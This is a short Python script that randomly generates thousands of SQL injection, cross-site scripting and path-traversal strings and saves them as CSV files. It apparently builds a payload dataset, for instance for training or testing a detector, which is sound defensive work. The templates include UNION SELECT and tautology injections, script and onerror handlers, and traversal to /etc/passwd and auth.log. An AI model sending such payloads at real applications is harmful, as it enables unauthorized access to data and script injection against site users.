import pandas as pd
import random
import string
import os
import urllib.parse

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TARGET = 5000

def rand_str(n=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

# ---------- SQL Injection ----------
def gen_unique_sqli():
    patterns = [
        "' OR '{}'='{}' --",
        "' UNION SELECT {},{} FROM {} --",
        "' AND {}={} --",
        "' OR {} LIKE '{}' --"
    ]
    return random.choice(patterns).format(
        rand_str(), rand_str(),
        rand_str(), rand_str(), rand_str(),
        random.randint(0, 9),
        rand_str(), rand_str()
    )

# ---------- XSS ----------
def gen_unique_xss():
    patterns = [
        "<script>{}('{}')</script>",
        "<img src=x onerror={}('{}')>",
        "<svg onload={}('{}')>",
        "<body onload={}('{}')>"
    ]
    return random.choice(patterns).format(
        random.choice(["alert", "confirm", "prompt"]),
        rand_str()
    )

# ---------- Path Traversal ----------
def gen_unique_path():
    depth = random.randint(3, 8)
    traversal = "../" * depth
    file = random.choice([
        "etc/passwd",
        "var/log/auth.log",
        "windows/system.ini",
        "boot.ini",
        "config.php"
    ])
    payload = traversal + file
    return random.choice([
        payload,
        urllib.parse.quote(payload),
        payload.replace("/", "//")
    ])

def generate_unique(generator):
    s = set()
    while len(s) < TARGET:
        s.add(generator())
    return list(s)

pd.DataFrame({"payload": generate_unique(gen_unique_sqli)}) \
  .to_csv(os.path.join(BASE_DIR, "sqli.csv"), index=False)

pd.DataFrame({"payload": generate_unique(gen_unique_xss)}) \
  .to_csv(os.path.join(BASE_DIR, "xss.csv"), index=False)

pd.DataFrame({"payload": generate_unique(gen_unique_path)}) \
  .to_csv(os.path.join(BASE_DIR, "path_traversal.csv"), index=False)

print("5000 UNIQUE SQLi, XSS, and Path Traversal payloads generated")
